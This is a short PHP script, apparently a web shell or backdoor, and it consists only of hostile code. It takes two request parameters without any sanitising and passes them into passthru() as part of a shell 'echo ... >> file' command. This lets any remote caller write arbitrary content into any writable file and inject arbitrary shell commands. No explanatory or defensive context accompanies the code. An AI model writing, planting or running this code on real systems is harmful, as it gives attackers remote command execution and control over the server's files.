<?php
echo "start";
if (function_exists('passthru')) 
	passthru('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>